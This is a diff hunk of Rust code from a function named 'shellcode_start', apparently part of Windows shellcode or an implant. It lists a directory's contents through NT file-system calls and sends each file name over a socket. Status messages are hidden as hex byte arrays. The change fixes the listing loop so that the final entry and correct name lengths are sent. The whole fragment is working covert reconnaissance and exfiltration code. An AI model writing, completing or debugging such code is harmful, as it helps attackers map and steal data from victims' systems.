@@ -270,15 +270,23 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     let status = ntfs::query_directory(fs_funcs, handle, file_names_information as _, 1460 as _);
                     if status == 0 as _ {
                         let dir_send_start_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x2cu8, 0x20u8, 0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x73u8, 0x0au8];
+                        let newline_msg = [0x0au8];
                         let _ = socket.send(&dir_send_start_msg as *const u8, 32 as _);
-                        while (*file_names_information).NextEntryOffset != 0 {
+                        let mut last_iteration_was_done: u32 = 0;
+                        while last_iteration_was_done == 0 as _ {
                             // note: FileName is wide character array
+                            // when NextEntryOffset == 0, it is the last iteration to do
                             let file_name: *const u16 = &((*file_names_information).FileName) as _;
-                            let file_name_length = ((*file_names_information).FileNameLength) * 2;
+                            let file_name_length = ((*file_names_information).FileNameLength);
                             let _ = socket.send(file_name as _, file_name_length as _);
-                            file_names_information = (file_names_information as *mut u8).offset(
-                                (*file_names_information).NextEntryOffset as _
-                            ) as ntdef::structs::PFILE_NAMES_INFORMATION;
+                            let _ = socket.send(&newline_msg as *const u8, 1 as _);
+                            if (*file_names_information).NextEntryOffset == 0 {
+                                last_iteration_was_done = 1 as _;
+                            } else {
+                                file_names_information = (file_names_information as *mut u8).offset(
+                                    (*file_names_information).NextEntryOffset as _
+                                ) as ntdef::structs::PFILE_NAMES_INFORMATION;
+                            }
                         }
                         let dir_listing_finished_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
                         let _ = socket.send(&dir_listing_finished_msg as *const u8, 27 as _);
